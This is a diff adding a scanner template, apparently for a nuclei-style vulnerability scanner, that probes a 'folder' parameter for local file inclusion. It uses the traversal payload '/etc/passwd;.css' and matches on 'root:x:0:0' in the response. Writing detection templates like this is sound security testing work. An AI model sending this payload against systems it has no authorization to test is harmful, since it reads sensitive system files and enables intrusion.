@@ -1,0 +1,20 @@
+id: lfi6-0413
+name: 'Traversal in folder'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via folder'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      folder:
+        - '/etc/passwd;.css'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
